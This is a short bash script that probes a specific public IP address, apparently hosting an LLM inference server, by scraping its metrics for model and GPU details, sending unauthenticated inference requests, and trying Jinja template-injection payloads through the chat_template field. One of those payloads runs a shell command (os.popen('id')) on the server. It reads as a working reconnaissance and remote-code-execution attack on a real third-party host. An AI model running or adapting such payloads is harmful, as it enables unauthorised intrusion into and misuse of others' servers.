#!/bin/bash
B=http://123.184.7.135:8000
J='-H Content-Type:application/json'
echo "=== model names in metrics"
curl -s -m 15 "$B/metrics" -o /tmp/m
grep -oE 'model_name="[^"]+"' /tmp/m | sort -u | head -5
grep -oE 'model_tag="[^"]+"' /tmp/m | sort -u | head -5
grep -oE 'gpu_type="[^"]+"' /tmp/m | head -3
grep -oE 'num_gpus[a-z_]*\{[^}]*\}[^ ]* [0-9.]+' /tmp/m | head -3
M=$(grep -oE 'model_name="[^"]+"' /tmp/m | head -1 | cut -d'"' -f2); echo "MODEL=$M"
[ -z "$M" ] && M=vllm-model
echo "=== inference unauth"
curl -s -m 30 -o /tmp/a -w 'i1 %{http_code} ' -X POST $J -d "{\"model\":\"$M\",\"messages\":[{\"role\":\"user\",\"content\":\"say hi\"}],\"max_tokens\":4}" "$B/invocations"; head -c 400 /tmp/a; echo
echo "=== chat_template ssti"
curl -s -m 30 -o /tmp/a -w 'i2 %{http_code} ' -X POST $J -d "{\"model\":\"$M\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}],\"chat_template\":\"{{7*7}}\",\"max_tokens\":4}" "$B/invocations"; head -c 400 /tmp/a; echo
curl -s -m 30 -o /tmp/a -w 'i3 %{http_code} ' -X POST $J -d "{\"model\":\"$M\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}],\"chat_template\":\"{{cycler.__init__.__globals__.os.popen('id').read()}}\",\"max_tokens\":4}" "$B/invocations"; head -c 500 /tmp/a; echo
echo "=== sm generate"
curl -s -m 30 -o /tmp/a -w 'g1 %{http_code} ' -X POST $J -d "{\"inputs\":\"hello\",\"parameters\":{\"max_new_tokens\":4}}" "$B/inference/v1/generate"; head -c 300 /tmp/a; echo
echo "=== tokenize real model"
curl -s -m 15 -o /tmp/a -w 'tk %{http_code} ' -X POST $J -d "{\"model\":\"$M\",\"prompt\":\"hello\"}" "$B/tokenize"; head -c 200 /tmp/a; echo
echo DONE
